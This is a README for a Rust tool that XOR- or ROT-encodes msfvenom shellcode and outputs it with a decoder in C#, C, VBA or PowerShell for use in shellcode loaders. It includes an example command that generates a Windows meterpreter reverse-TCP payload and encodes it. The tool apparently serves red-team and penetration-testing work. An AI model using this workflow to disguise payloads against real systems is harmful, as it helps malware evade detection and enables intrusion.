# shellcode-encoder

CLI utility to encode msfvenom generated shellcode.

Reads shellcode in hex format from stdin, and then performs selected encoding and outputs encoded shellcode with a decoding routine.

Intended use is for shellcode loaders.

Supported encodings:
- XOR
- ROT

Supported output formats:
- C# (csharp)
- C (c)
- VBA (vbapplication)
- Powershell (ps1)

## Installation

```sh
cargo install --git https://github.com/aol1306/shellcode-encoder
```

## Example usage

Encode shellcode from msfvenom using XOR operation (`output[i] = shellcode[i] ^ 17`):

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f hex | shellcode-encoder -f csharp -e xor -k 17
```

View help:

```sh
shellcode-encoder --help
```

## Tips

- Any bin file can be easily converted to the required hex format by piping it to `hexdump -ve '1/1 "%.2x"'`.